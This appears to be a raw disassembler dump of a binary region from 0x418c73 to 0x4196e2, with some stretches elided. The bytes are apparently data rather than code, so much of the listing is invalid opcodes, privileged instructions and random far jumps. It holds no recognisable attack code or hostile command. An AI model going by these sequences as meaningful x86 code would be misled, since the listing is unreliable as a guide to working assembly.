  418c73:	popa   
  418c74:	adc    al,al
  418c76:	ja     0x418cba
  418c78:	aas    
  418c79:	cmp    cl,BYTE PTR [esi-0x548359f1]
  418c7f:	cmp    eax,0xc58ca6b0
  418c84:	sti    
  418c85:	mov    al,ds:0xea8938c7
  418c8a:	in     eax,0x96
  418c8c:	inc    eax
  418c8d:	cmp    al,0xac
  418c8f:	lds    eax,FWORD PTR [eax]
	...
  418cf1:	add    BYTE PTR [eax],al
  418cf3:	add    bl,bh
  418cf5:	inc    edx
  418cf6:	out    dx,al
  418cf7:	aas    
  418cf8:	(bad)  
  418cf9:	mov    edi,0x6a1ac6fb
  418cfe:	(bad)  
  418cff:	shl    cl,cl
  418d01:	pop    ss
  418d02:	xchg   edx,eax
  418d03:	dec    edi
  418d04:	lods   al,BYTE PTR ds:[esi]
  418d05:	push   es
  418d06:	add    DWORD PTR [eax],eax
  418d08:	add    al,0x1
  418d0a:	add    BYTE PTR [eax],al
  418d0c:	mov    ch,ah
  418d0e:	dec    di
  418d10:	je     0x418cc3
  418d12:	or     BYTE PTR [ebx-0x26b8f2db],ah
  418d18:	push   esi
  418d19:	or     bl,BYTE PTR [ecx+0x0]
  418d1c:	push   eax
  418d1d:	popf   
  418d1e:	cdq    
  418d1f:	dec    esi
  418d20:	pop    edx
  418d21:	arpl   WORD PTR [edx+0x40],ax
  418d24:	fmul   QWORD PTR [ebx]
  418d26:	dec    esp
  418d27:	dec    edx
  418d28:	xchg   DWORD PTR [ebp+0x4ef3144a],ebp
  418d2e:	into   
  418d2f:	sub    esp,ecx
  418d31:	aad    0xad
  418d33:	mov    ah,0x70
  418d35:	fdiv   st(4),st
  418d37:	cmp    al,0xb8
  418d39:	xor    DWORD PTR [esi+0x2c98e647],esi
  418d3f:	or     DWORD PTR [ebx+0x7d6b23f7],0x4
  418d46:	repnz add cl,ch
  418d49:	outs   dx,DWORD PTR ds:[esi]
  418d4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d4b:	stc    
  418d4c:	loopne 0x418d58
  418d4e:	popf   
  418d4f:	jge    0x418ce8
  418d51:	iret   
  418d52:	xchg   ebx,eax
  418d53:	xor    DWORD PTR [edi+0x55],ebx
  418d56:	call   0xda950ed7
  418d5b:	jle    0x418d8c
  418d5d:	and    esp,ecx
  418d5f:	mov    DWORD PTR [esi+edx*2+0x650abc9f],esi
  418d66:	xchg   ecx,eax
  418d67:	leave  
  418d68:	sbb    bl,BYTE PTR [ecx-0x607982ef]
  418d6e:	shl    DWORD PTR [eax-0x4b1ff3e9],cl
  418d74:	outs   dx,DWORD PTR ds:[esi]
  418d75:	xchg   esi,eax
  418d76:	add    al,0xba
  418d78:	push   eax
  418d79:	jge    0x418d24
  418d7b:	xor    ecx,edi
  418d7d:	or     BYTE PTR [ecx-0x33304e3a],0x12
  418d84:	ret    0xfb0d
  418d87:	mov    esp,DWORD PTR [ebx+0x2c]
  418d8a:	and    BYTE PTR [ebp-0x419cc38b],ch
  418d90:	or     BYTE PTR [ecx],0xbc
  418d93:	ror    DWORD PTR [eax],cl
  418d95:	fmul   QWORD PTR [ecx-0x23593831]
  418d9b:	adc    DWORD PTR [esi],esi
  418d9d:	ror    BYTE PTR [edx+0x5eb0768c],1
  418da3:	jmp    0x418d74
  418da5:	dec    ebx
  418da6:	mov    ah,0xc9
  418da8:	ins    BYTE PTR es:[edi],dx
  418da9:	retf   0xe764
  418dac:	mov    eax,ds:0xacf1c679
  418db1:	call   0xcde5:0x7591eab2
  418db8:	int3   
  418db9:	push   ebp
  418dba:	mov    cl,al
  418dbc:	or     al,0xf6
  418dbe:	in     eax,dx
  418dbf:	pop    eax
  418dc0:	ret    0x550f
  418dc3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418dc4:	(bad)  
  418dc5:	lahf   
  418dc6:	bound  eax,QWORD PTR [esi-0x52]
  418dc9:	shl    BYTE PTR gs:[eax+0x46],cl
  418dcd:	fs add edi,ebp
  418dd0:	in     eax,dx
  418dd1:	stc    
  418dd2:	mov    ds:0xfae1b362,eax
  418dd7:	mov    ds,WORD PTR [ebp+0x6477abf8]
  418ddd:	ffree  st(5)
  418ddf:	lock inc eax
  418de1:	mov    DWORD PTR [ebp-0x6f5ab2d5],esi
  418de7:	mov    WORD PTR [ecx+0x65],es
  418dea:	mov    dh,0x59
  418dec:	js     0x418de0
  418dee:	mov    ds:0x4f2d7e1a,eax
  418df3:	and    BYTE PTR [eax+0x68],bl
  418df6:	sbb    al,0xbf
  418df8:	aam    0xa8
  418dfa:	shl    BYTE PTR [esi+0x7bef0625],1
  418e00:	fs (bad) 
  418e02:	(bad)  
  418e03:	stos   DWORD PTR es:[edi],eax
  418e04:	daa    
  418e05:	outs   dx,DWORD PTR ds:[esi]
  418e06:	sub    ah,BYTE PTR [ecx]
  418e08:	fist   WORD PTR [ebx-0x70]
  418e0b:	stos   DWORD PTR es:[edi],eax
  418e0c:	mov    al,0xbd
  418e0e:	ret    0xb3
	...
  418e71:	add    BYTE PTR [eax],al
  418e73:	add    BYTE PTR [esi],cl
  418e75:	bnd call 0xde7c8aab
  418e7b:	dec    dl
  418e7d:	leave  
  418e7e:	and    ah,BYTE PTR [edx-0x68]
  418e81:	in     eax,0x47
  418e83:	xor    DWORD PTR [eax+0x4000107],0x78000001
  418e8d:	add    BYTE PTR [edx+esi*2],0x55
  418e91:	test   eax,0x40ccf76b
  418e96:	call   0x108d:0xf7600ac9
  418e9d:	push   ebx
  418e9e:	rcr    DWORD PTR [ebp+0x59901532],cl
  418ea4:	dec    esi
  418ea5:	inc    ebp
  418ea6:	xor    bl,ch
  418ea8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ea9:	adc    dl,BYTE PTR [esi]
  418eab:	cli    
  418eac:	pushf  
  418ead:	add    eax,0x57fecfc4
  418eb2:	add    ebp,DWORD PTR [eax+0x6a]
  418eb5:	lods   eax,DWORD PTR ds:[esi]
  418eb6:	dec    edi
  418eb7:	sbb    eax,0xa205352a
  418ebc:	dec    esi
  418ebd:	in     al,0xc0
  418ebf:	mov    dh,0x92
  418ec1:	jp     0x418f19
  418ec3:	cli    
  418ec4:	arpl   dx,dx
  418ec6:	fist   DWORD PTR [edx+0x4c]
  418ec9:	jecxz  0x418e78
  418ecb:	popa   
  418ecc:	xchg   BYTE PTR [eax-0x7384f911],ah
  418ed2:	sar    DWORD PTR [eax],1
  418ed4:	pop    esp
  418ed5:	sahf   
  418ed6:	lods   al,BYTE PTR ds:[esi]
  418ed7:	stc    
  418ed8:	fstp   DWORD PTR [eax+0x2a50dd4b]
  418ede:	(bad)  
  418edf:	je     0x418e88
  418ee1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ee2:	xor    BYTE PTR [ecx],ch
  418ee4:	inc    esi
  418ee5:	pushf  
  418ee6:	mov    cl,0x63
  418ee8:	pop    ebp
  418ee9:	mov    edx,0xe49066af
  418eee:	aam    0x44
  418ef0:	cs int3 
  418ef2:	outs   dx,BYTE PTR ds:[esi]
  418ef3:	imul   ecx,DWORD PTR [ebx-0x5636a64c],0x3d
  418efa:	pop    es
  418efb:	clc    
  418efc:	and    dh,BYTE PTR [edi-0x3a]
  418eff:	jecxz  0x418f1d
  418f01:	retf   0xdadc
  418f04:	sti    
  418f05:	repz mov ecx,DWORD PTR [edi-0x173026fd]
  418f0c:	add    al,0x7d
  418f0e:	loopne 0x418e91
  418f10:	sbb    DWORD PTR [edx],ecx
  418f12:	and    BYTE PTR ds:0xbbc9e44c,0x6
  418f19:	scas   al,BYTE PTR es:[edi]
  418f1a:	mov    edi,0xd2a2b7b
  418f1f:	mov    esi,0xe3c7c787
  418f24:	mov    ecx,0x9916c8d2
  418f29:	call   0x8bf1c1d0
  418f2e:	clc    
  418f2f:	ss mov ecx,0xdb843577
  418f35:	pop    ecx
  418f36:	or     DWORD PTR [edi+0x22aa5fdb],ebx
  418f3c:	ret    
  418f3d:	sbb    bh,BYTE PTR [esi]
  418f3f:	sub    dh,BYTE PTR [ebx-0x18238003]
  418f45:	mov    bl,0x1e
  418f47:	ss inc ebp
  418f49:	push   ecx
  418f4a:	or     DWORD PTR [ebx+esi*1+0x7333abf7],eax
  418f51:	jecxz  0x418f5a
  418f53:	dec    ebp
  418f54:	lds    ebx,FWORD PTR [edi-0x426bd29d]
  418f5a:	inc    eax
  418f5b:	jno    0x418fd0
  418f5d:	clc    
  418f5e:	(bad)  
  418f5f:	mov    cl,0xd8
  418f61:	int3   
  418f62:	adc    al,ah
  418f64:	or     al,0x12
  418f66:	cli    
  418f67:	scas   eax,DWORD PTR es:[edi]
  418f68:	inc    ebx
  418f69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f6a:	cdq    
  418f6b:	ret    
  418f6c:	daa    
  418f6d:	jmp    0x620f:0xabb53b9d
  418f74:	int3   
  418f75:	aam    0x6d
  418f77:	test   BYTE PTR [eax+eiz*4],ah
  418f7a:	call   0xbf5e9d53
  418f7f:	cmp    DWORD PTR [edx],0x13
  418f82:	ds mov esp,0x45bcb129
  418f88:	mov    al,ds:0x9e0d25f5
  418f8d:	mov    ebp,DWORD PTR [ecx]
  418f8f:	sti    
	...
  418ff4:	sbb    al,0x97
  418ff6:	in     al,0x47
  418ff8:	out    dx,eax
  418ff9:	ja     0x418fba
  418ffb:	fild   WORD PTR [ecx+0x33eaf1a7]
  419001:	aaa    
  419002:	adc    BYTE PTR [esp+esi*4],dl
  419005:	or     BYTE PTR [ecx],al
  419007:	add    BYTE PTR [ecx+eax*1],al
  41900a:	add    BYTE PTR [eax],al
  41900c:	cwde   
  41900d:	hlt    
  41900e:	imul   BYTE PTR [edx+0xd]
  419011:	aam    0xaf
  419013:	(bad)
  419017:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419018:	push   esp
  419019:	(bad)  
  41901a:	int    0x3
  41901c:	or     BYTE PTR [edi],dl
  41901e:	test   esi,edx
  419020:	js     0x418faa
  419022:	add    eax,0x184cc4a4
  419027:	and    al,0x63
  419029:	inc    ebp
  41902a:	or     ebp,ebp
  41902c:	push   cs
  41902d:	ret    
  41902e:	retf   0x7e18
  419031:	test   eax,0x8564e46b
  419036:	xlat   BYTE PTR ds:[ebx]
  419037:	repnz mov ebx,0xadad0010
  41903d:	(bad)  
  41903e:	fisttp DWORD PTR [eax+edx*2]
  419041:	arpl   WORD PTR [eax+ecx*1+0x4b],di
  419045:	ret    0x264c
  419048:	fldenv [eax-0x59]
  41904b:	pop    es
  41904c:	inc    esi
  41904d:	sub    al,0x83
  41904f:	add    DWORD PTR [edx],ebp
  419051:	lods   eax,DWORD PTR ds:[esi]
  419052:	aam    0xd2
  419054:	ss cli 
  419056:	xchg   ah,al
  419058:	mov    bh,0xa9
  41905a:	cmp    BYTE PTR [eax+eax*8+0x6a35437e],0x8e
  419062:	push   0xffffffa0
  419064:	bound  ebp,QWORD PTR [ecx-0x5c]
  419067:	or     edi,DWORD PTR [esi+0x20f20e03]
  41906d:	cwde   
  41906e:	ins    BYTE PTR es:[edi],dx
  41906f:	scas   al,BYTE PTR es:[edi]
  419070:	icebp  
  419071:	jmp    0xcd64:0xbc51d595
  419078:	fsubr  st,st(0)
  41907a:	jg     0x419004
  41907c:	repnz das 
  41907e:	retf   0x5102
  419081:	imul   ebx,edi,0x78
  419084:	sub    BYTE PTR [ebp+ebx*1+0x5a],ah
  419088:	xor    eax,0xc2565ce6
  41908d:	push   0xffffffdb
  41908f:	mov    ebp,0xdda4c94b
  419094:	jbe    0x41910b
  419096:	xor    dl,cl
  419098:	repz loopne 0x419027
  41909b:	fadd   DWORD PTR [edi]
  41909d:	ret    0x1621
  4190a0:	mov    ds:0x6222fb2a,eax
  4190a5:	xor    bl,dl
  4190a7:	mov    eax,ds:0x23d8f3c5
  4190ac:	js     0x419068
  4190ae:	or     ecx,ebx
  4190b0:	rcr    esp,cl
  4190b2:	in     al,dx
  4190b3:	ret    0xb7db
  4190b6:	xor    eax,0x37edbf29
  4190bb:	xlat   BYTE PTR ds:[ebx]
  4190bc:	outs   dx,DWORD PTR ds:[esi]
  4190bd:	(bad)  
  4190be:	rcl    DWORD PTR [edi-0x7b],1
  4190c1:	sub    ch,bh
  4190c3:	out    dx,al
  4190c4:	pop    esi
  4190c5:	push   ebp
  4190c6:	sub    BYTE PTR [edx-0x1618b225],ah
  4190cc:	jb     0x4190ed
  4190ce:	imul   ebx,DWORD PTR [esi-0x6c17d988],0xffffff96
  4190d5:	cmp    dl,ah
  4190d7:	xchg   ebx,eax
  4190d8:	loop   0x419139
  4190da:	xchg   ebp,eax
  4190db:	(bad)  
  4190dd:	jae    0x4190d7
  4190df:	push   ebp
  4190e0:	jbe    0x4190f9
  4190e2:	jmp    0x4190f9
  4190e4:	add    bh,dl
  4190e6:	mov    cl,BYTE PTR [ebx-0x43]
  4190e9:	sbb    eax,0xbd720c07
  4190ee:	rcr    BYTE PTR [esi],cl
  4190f0:	and    DWORD PTR [esi-0x48587116],0x1b
  4190f7:	mov    ?,WORD PTR [edx-0x609fa292]
  4190fd:	sub    eax,0x6eb0e60
  419102:	mov    cl,0x7a
  419104:	das    
  419105:	pusha  
  419106:	or     al,0x8a
  419108:	aas    
  419109:	sahf   
  41910a:	hlt    
  41910b:	clc    
  41910c:	jp     0x419117
  41910e:	psubb  mm0,QWORD PTR [eax]
	...
  419171:	add    BYTE PTR [eax],al
  419173:	add    BYTE PTR [edi-0x41bd617b],ch
  419179:	pop    ebx
  41917a:	(bad)  
  41917b:	in     eax,dx
  41917c:	inc    esi
  41917d:	push   0x4d
  41917f:	or     dl,BYTE PTR [edx+eiz*8]
  419182:	mov    ch,0xa2
  419184:	mov    eax,0x4000109
  419189:	add    DWORD PTR [eax],eax
  41918b:	add    BYTE PTR [ecx+edx*2-0x2e],bl
  41918f:	mov    ebp,0x84dbd2e6
  419194:	fmul   DWORD PTR [ebx+0x5d]
  419197:	(bad)  
  419198:	repz dec edx
  41919a:	push   0x67
  41919c:	call   0x2ce:0x64b3d2a9
  4191a3:	mov    ebp,0x8c06bd24
  4191a8:	fsub   DWORD PTR [ebx-0x3e6b507e]
  4191ae:	std    
  4191af:	add    esp,0x6
  4191b2:	and    eax,0x33e1356
  4191b7:	jns    0x4191e1
  4191b9:	inc    ecx
  4191ba:	inc    ebx
  4191bb:	add    DWORD PTR [edi+edx*8-0x55],0xffffffbd
  4191c0:	sub    BYTE PTR [ebx],ah
  4191c2:	div    DWORD PTR [esi-0xcb05afc]
  4191c8:	dec    edx
  4191c9:	arpl   WORD PTR [ecx+0xd],cx
  4191cc:	and    BYTE PTR [ecx],0xf2
  4191cf:	adc    cl,BYTE PTR gs:[esi+0x177df274]
  4191d6:	pop    esp
  4191d7:	push   ebp
  4191d8:	inc    esp
  4191d9:	jb     0x419224
  4191db:	jnp    0x419227
  4191dd:	jl     0x4191c7
  4191df:	xchg   ebp,eax
  4191e0:	jge    0x419187
  4191e2:	mov    DWORD PTR [esi],esi
  4191e4:	mov    cl,0xdd
  4191e6:	pop    eax
  4191e7:	fs jbe 0x4191b7
  4191ea:	fwait
  4191eb:	mov    DWORD PTR [ecx-0xd],esi
  4191ee:	stos   DWORD PTR es:[edi],eax
  4191ef:	pop    ebx
  4191f0:	aad    0x83
  4191f2:	fwait
  4191f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4191f4:	mov    bh,0x8c
  4191f6:	test   al,0xaf
  4191f8:	dec    eax
  4191f9:	jmp    0x8e90:0xa2a96d87
  419200:	daa    
  419201:	cmp    eax,0x97a48aec
  419206:	mov    WORD PTR [esi+0x1f],gs
  419209:	jno    0x41927c
  41920b:	les    ebx,FWORD PTR [ebp-0x75]
  41920e:	xor    BYTE PTR [ebp-0x6558b508],dl
  419214:	aad    0x8b
  419216:	jae    0x4191ba
  419218:	sub    bl,ah
  41921a:	sar    edi,1
  41921c:	pushf  
  41921d:	cld    
  41921e:	push   es
  41921f:	mov    bh,BYTE PTR [esi+ebp*4]
  419222:	jo     0x4191f5
  419224:	loopne 0x4191fa
  419226:	fisttp WORD PTR [edx+0x41efe32e]
  41922c:	fidivr DWORD PTR ds:0xee7432bf
  419232:	sti    
  419233:	pusha  
  419234:	fs call 0x64eba2be
  41923a:	inc    ebp
  41923b:	mov    esi,0xb39fd66
  419240:	lods   al,BYTE PTR ds:[esi]
  419241:	mov    al,0x48
  419243:	int    0xf6
  419245:	cmp    cl,0x2
  419248:	ins    BYTE PTR es:[edi],dx
  419249:	sti    
  41924a:	push   0x34
  41924c:	jmp    0xd4bc08b3
  419251:	cdq    
  419252:	popa   
  419253:	push   esi
  419254:	leave  
  419255:	out    dx,eax
  419256:	push   ebx
  419257:	stos   BYTE PTR es:[edi],al
  419258:	bound  ebx,QWORD PTR [esi]
  41925a:	gs push ecx
  41925c:	les    edi,FWORD PTR [edx+0x79]
  41925f:	fidivr WORD PTR [edi-0x6e90dd84]
  419265:	repz fld st(1)
  419268:	mov    dl,0x60
  41926a:	retf   
  41926b:	xor    al,al
  41926d:	mov    eax,0x4de182af
  419272:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419273:	mov    ah,0xd9
  419275:	xor    eax,esp
  419277:	mov    esp,ebx
  419279:	jb     0x4192b7
  41927b:	stc    
  41927c:	sbb    ch,BYTE PTR [edi+ecx*2+0x1e185533]
  419283:	pop    ds
  419284:	sub    DWORD PTR [eax],0x99d9ccae
  41928a:	(bad)  
  41928b:	fdivrp st(5),st
  41928d:	xor    DWORD PTR [ecx-0x80],edx
	...
  4192f4:	mov    al,ds:0xff33bae7
  4192f9:	jg     0x4192a4
  4192fb:	neg    eax
  4192fd:	pop    ss
  4192fe:	daa    
  4192ff:	inc    edi
  419300:	mov    ecx,DWORD PTR [eax+0xabcf93e]
  419306:	add    DWORD PTR [eax],eax
  419308:	add    al,0x1
  41930a:	add    BYTE PTR [eax],al
  41930c:	inc    esi
  41930d:	add    al,0xb7
  41930f:	mov    dh,0xcb
  419311:	push   edi
  419312:	push   ss
  419313:	push   ebp
  419314:	sub    eax,0x7cdf0412
  419319:	mov    WORD PTR [si-0x50],fs
  41931d:	pop    es
  41931e:	pop    es
  41931f:	cmp    BYTE PTR [ebp-0x5c],0x22
  419323:	xchg   ecx,eax
  419324:	and    edx,DWORD PTR [ecx+eiz*1+0x2e]
  419328:	jl     0x4192d3
  41932a:	jo     0x419357
  41932c:	mov    ah,0xb4
  41932e:	xchg   esi,eax
  41932f:	scas   al,BYTE PTR es:[edi]
  419330:	sub    BYTE PTR [edx],dh
  419332:	mov    fs,WORD PTR [eax+0x5dcc2ea3]
  419338:	in     al,dx
  419339:	jmp    0x8e3f0b73
  41933e:	mov    cr4,edx
  419341:	jo     0x419368
  419343:	mov    dl,0xf5
  419345:	mov    al,ds:0x981feb30
  41934a:	xor    BYTE PTR [ebx+0x7ee2a1c5],bl
  419350:	mov    cl,0x62
  419352:	paddsb mm0,mm0
  419355:	les    ebp,FWORD PTR [edi+0x5274fe2]
  41935b:	push   ecx
  41935c:	jmp    0xfdac:0x2ddd7fea
  419363:	push   0x12b5bcd6
  419368:	push   0x17
  41936a:	mov    ds:0xe15cdf41,al
  41936f:	cmp    BYTE PTR [ebx+0x14fcdab1],0xfc
  419376:	sbb    ch,ch
  419378:	sahf   
  419379:	xor    BYTE PTR [eax+0x1659f4a2],bh
  41937f:	ficomp DWORD PTR [edx+0x41dca224]
  419385:	pop    eax
  419386:	frstor [ebp+ebx*1+0x72]
  41938a:	iret   
  41938b:	mov    edi,0x77066028
  419390:	jae    0x419379
  419392:	aam    0xdf
  419394:	dec    esi
  419395:	pop    edx
  419396:	mov    ebx,0x6f216ef5
  41939b:	pop    edx
  41939c:	jle    0x41932d
  41939e:	retf   0x8f2c
  4193a1:	sar    BYTE PTR [edx+0x62],cl
  4193a4:	add    DWORD PTR [ebp+0x3a],ecx
  4193a7:	loope  0x41933d
  4193a9:	mov    al,0xb2
  4193ab:	aas    
  4193ac:	hlt    
  4193ad:	sti    
  4193ae:	shl    BYTE PTR [eax+0x2d],0xfb
  4193b2:	xchg   edi,eax
  4193b4:	daa    
  4193b5:	int3   
  4193b6:	add    bl,BYTE PTR [ecx-0x73]
  4193b9:	sub    eax,0x9fc7fd93
  4193be:	fwait
  4193bf:	and    eax,0x49eaa30d
  4193c4:	mov    ah,0x60
  4193c6:	pop    ss
  4193c7:	neg    BYTE PTR [eax-0x25]
  4193ca:	mov    edi,0xee2a87c0
  4193cf:	jl     0x419388
  4193d1:	xor    edi,DWORD PTR [eax-0x6f]
  4193d4:	cmp    al,0x34
  4193d6:	stos   DWORD PTR es:[edi],eax
  4193d7:	sub    al,0x2b
  4193d9:	ins    DWORD PTR es:[edi],dx
  4193da:	das    
  4193db:	pop    ss
  4193dc:	pop    ss
  4193dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4193de:	dec    esp
  4193df:	add    cl,BYTE PTR [edx+ebx*2]
  4193e2:	pushf  
  4193e3:	aas    
  4193e4:	xchg   ecx,eax
  4193e5:	or     DWORD PTR [ebx+0x15959c2a],0x7fafaf0e
  4193ef:	jne    0x4193a3
  4193f1:	cld    
  4193f2:	in     eax,dx
  4193f3:	pop    edi
  4193f4:	cmp    eax,0x99d51701
  4193f9:	dec    eax
  4193fa:	leave  
  4193fb:	cmp    al,0x27
  4193fd:	and    dh,al
  4193ff:	iret   
  419400:	in     eax,dx
  419401:	mov    edx,0xd14bf9c5
  419406:	sbb    BYTE PTR [ecx+ebx*4+0x7],0xa5
  41940b:	or     BYTE PTR [edi],ah
  41940d:	dec    edi
  41940e:	inc    ebp
  41940f:	mov    al,BYTE PTR [eax]
	...
  419471:	add    BYTE PTR [eax],al
  419473:	add    BYTE PTR ds:0xed3a6998,bh
  419479:	sti    
  41947a:	jg     0x41941b
  41947c:	cmp    ebx,esi
  41947e:	je     0x419446
  419480:	xchg   BYTE PTR [eax],cl
  419482:	pop    ecx
  419483:	add    al,al
  419485:	or     eax,DWORD PTR [ecx]
  419487:	add    BYTE PTR [ecx+eax*1],al
  41948a:	add    BYTE PTR [eax],al
  41948c:	pop    edx
  41948d:	mov    cl,0x89
  41948f:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  419491:	mov    al,0xfe
  419493:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419494:	shr    esi,cl
  419496:	loope  0x419504
  419498:	adc    DWORD PTR [ecx+0x5d05ccbf],ebx
  41949e:	aaa    
  41949f:	aad    0x99
  4194a1:	(bad)  
  4194a2:	std    
  4194a3:	pop    ds
  4194a4:	test   al,0xa0
  4194a6:	enter  0xe7b7,0x9b
  4194aa:	adc    eax,0x6438e04c
  4194af:	dec    ebp
  4194b0:	mov    ds:0xc64bd4c9,al
  4194b5:	jecxz  0x4194f4
  4194b7:	sub    al,0x87
  4194b9:	ds dec esp
  4194bb:	and    edi,ecx
  4194bd:	call   0x255c40d0
  4194c2:	push   edi
  4194c3:	mov    cl,0x42
  4194c5:	ror    BYTE PTR [edi-0x75],1
  4194c8:	fsubp  st(5),st
  4194ca:	jl     0x41950f
  4194cc:	jbe    0x4194cf
  4194ce:	das    
  4194cf:	and    al,0x92
  4194d1:	push   eax
  4194d2:	jb     0x419552
  4194d4:	stos   DWORD PTR es:[edi],eax
  4194d5:	xor    DWORD PTR [ecx],edi
  4194d7:	pop    eax
  4194d8:	cmp    ecx,0xffffffab
  4194db:	jmp    0x1e3c:0x98d818c2
  4194e2:	mov    edi,0x49e49049
  4194e7:	push   es
  4194e8:	mov    ch,0x5e
  4194ea:	mov    ebx,0x1c3d723e
  4194ef:	scas   eax,DWORD PTR es:[edi]
  4194f0:	push   edx
  4194f1:	bswap  edx
  4194f3:	cmp    ebp,DWORD PTR [esp+edx*8-0x77c4072b]
  4194fa:	jno    0x41956f
  4194fc:	mov    al,0xf
  4194fe:	iret   
  4194ff:	sub    BYTE PTR [esi-0x8],ch
  419502:	mov    ds:0xf972ecc,eax
  419507:	imul   eax,DWORD PTR [esi],0x26
  41950a:	or     ebp,DWORD PTR [ecx+0x29c9fadd]
  419510:	push   eax
  419511:	adc    BYTE PTR [eax],cl
  419513:	push   eax
  419514:	icebp  
  419515:	lods   eax,DWORD PTR ds:[esi]
  419516:	pop    edx
  419517:	xchg   edi,eax
  419518:	int3   
  419519:	arpl   WORD PTR [esi],di
  41951b:	rcl    DWORD PTR [edx-0x71],cl
  41951e:	addr16 aam 0x4e
  419521:	pop    ecx
  419522:	dec    esi
  419523:	ins    DWORD PTR es:[edi],dx
  419524:	pop    ebx
  419525:	leave  
  419526:	mov    dl,0xa8
  419528:	adc    eax,0x7c00269
  41952d:	and    DWORD PTR [ebx],ecx
  41952f:	lock int 0x6b
  419532:	sahf   
  419533:	mov    ds:0xc99958cf,eax
  419538:	pop    ebx
  419539:	jp     0x4195b8
  41953b:	pop    eax
  41953c:	add    al,0xe9
  41953e:	stos   BYTE PTR es:[edi],al
  41953f:	dec    esp
  419540:	cmp    eax,0xe2b2fc6c
  419545:	(bad)  
  419546:	pop    es
  419547:	out    dx,eax
  419548:	outs   dx,DWORD PTR ds:[esi]
  419549:	sub    bl,ah
  41954b:	xor    eax,DWORD PTR [ebp+edx*2-0x78b12b62]
  419552:	push   cs
  419553:	sar    DWORD PTR [ebx+0x7b20a40b],0x3f
  41955a:	popa   
  41955b:	pop    ds
  41955c:	push   edi
  41955d:	shl    BYTE PTR [edi+eax*8+0x517369a8],1
  419564:	mov    WORD PTR [edi-0x524059e8],ss
  41956a:	mov    ds:0x21646756,eax
  41956f:	or     dh,BYTE PTR [edx+0x6560014]
  419575:	dec    esp
  419576:	add    al,BYTE PTR [edx+0x14]
  419579:	aad    0x99
  41957b:	sbb    DWORD PTR [esi],esi
  41957d:	dec    ecx
  41957e:	je     0x223be5ff
  419584:	xchg   esi,eax
  419585:	in     al,dx
  419586:	sbb    dl,BYTE PTR [ebp-0x7aca8895]
  41958c:	ret    0x90b6
  41958f:	ins    BYTE PTR es:[edi],dx
	...
  4195f4:	scas   eax,DWORD PTR es:[edi]
  4195f5:	aam    0x8d
  4195f7:	(bad)  
  4195f8:	(bad)  
  4195f9:	jnp    0x4195ea
  4195fb:	fstp   st(1)
  4195fd:	fcomp  QWORD PTR [ebx+0x2f]
  419600:	cli    
  419601:	fisttp DWORD PTR [edi]
  419603:	jg     0x4195c9
  419605:	or     al,0x1
  419607:	add    BYTE PTR [ecx+eax*1],al
  41960a:	add    BYTE PTR [eax],al
  41960c:	in     eax,dx
  41960d:	and    al,0xee
  41960f:	mov    ebx,0xaf097375
  419614:	xlat   BYTE PTR ds:[ebx]
  419615:	mov    bh,0x2c
  419617:	jle    0x41959a
  419619:	xchg   edx,eax
  41961a:	xor    BYTE PTR [edi],dh
  41961c:	bound  ecx,QWORD PTR [esi+0x342e9a2]
  419622:	stc    
  419623:	or     al,0xc
  419625:	inc    ebx
  419626:	loop   0x41965f
  419628:	xor    eax,0xdc78645d
  41962d:	pop    ebp
  41962e:	ins    BYTE PTR es:[edi],dx
  41962f:	pop    edx
  419630:	pop    DWORD PTR [edi]
  419632:	loopne 0x4195d7
  419634:	fnstenv [esi+0x7c]
  419637:	and    al,0x50
  419639:	jmp    0x6973:0x9ff5186a
  419640:	inc    edx
  419641:	repnz inc ebx
  419643:	dec    DWORD PTR [ebx]
  419645:	(bad)  
  419646:	dec    ebx
  419647:	sub    BYTE PTR [ecx-0x759b7332],bl
  41964d:	jle    0x419622
  41964f:	rcr    BYTE PTR [edx+eax*2+0x5f],1
  419653:	or     al,0xc3
  419655:	fld    DWORD PTR [esi]
  419657:	add    BYTE PTR [edi-0x58a6ecb8],cl
  41965d:	xor    al,0x10
  41965f:	and    ecx,esi
  419661:	jle    0x419633
  419663:	dec    ecx
  419664:	mov    eax,0x60aef436
  419669:	push   cs
  41966a:	push   ebp
  41966b:	push   bp
  41966d:	pop    eax
  41966e:	mov    ch,0x64
  419670:	jmp    0x391a1cea
  419675:	jmp    0xe7689987
  41967a:	in     al,0x8b
  41967c:	cmp    al,0xb2
  41967e:	and    edx,ebx
  419680:	mov    esp,0xeaecc925
  419685:	das    
  419686:	mov    ah,0xea
  419688:	mov    esp,0xd5ebe781
  41968d:	jecxz  0x4196a3
  41968f:	mov    al,ds:0xc70f2982
  419694:	gs adc al,0xb6
  419697:	ins    DWORD PTR es:[edi],dx
  419698:	xchg   esp,eax
  419699:	inc    eax
  41969a:	stos   BYTE PTR es:[edi],al
  41969b:	mov    al,al
  41969d:	test   eax,ebx
  41969f:	hlt    
  4196a0:	push   0x59
  4196a2:	popf   
  4196a3:	push   ebp
  4196a4:	ds fs xchg ecx,eax
  4196a7:	ret    
  4196a8:	icebp  
  4196a9:	test   ah,0x5a
  4196ac:	adc    BYTE PTR [ecx+0x8],bh
  4196af:	push   ds
  4196b0:	dec    esp
  4196b1:	and    DWORD PTR [edi+ebx*2],0x2d9bd146
  4196b8:	push   es
  4196b9:	mov    ch,BYTE PTR [ebx+0x569ea88b]
  4196bf:	mov    bl,0x37
  4196c1:	sbb    eax,0x5d12033e
  4196c6:	xchg   BYTE PTR [ecx+0xa],cl
  4196c9:	fwait
  4196ca:	scas   al,BYTE PTR es:[edi]
  4196cb:	add    dl,dl
  4196cd:	push   esi
  4196ce:	pop    ecx
  4196cf:	pop    ebx
  4196d0:	mov    ds:0x8be93b67,eax
  4196d5:	js     0x4196b5
  4196d7:	das    
  4196d8:	inc    edi
  4196d9:	jle    0x41973d
  4196db:	test   DWORD PTR [ecx-0x23],ecx
  4196de:	daa    
  4196df:	adc    al,0xf5
  4196e1:	pop    ds
  4196e2:	cmp    eax,0x4a93d8c3
